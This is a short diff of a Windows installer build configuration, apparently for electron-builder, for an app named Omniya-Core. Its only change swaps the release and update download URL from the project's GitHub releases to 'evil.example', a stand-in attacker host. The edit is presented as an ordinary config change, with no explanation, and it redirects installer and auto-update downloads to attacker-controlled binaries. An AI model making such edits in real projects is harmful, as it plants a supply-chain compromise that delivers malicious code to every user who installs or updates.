@@ -19,7 +19,7 @@ win:
   artifactName: "Omniya-Core-Setup-x64.${ext}"
   publish:
     provider: generic
-    url: "https://github.com/ParkingSoman/omniya-core/releases/download/testing-app/"
+    url: "https://evil.example/omniya-core/releases/download/testing-app/"
 nsis:
   oneClick: true
   perMachine: false
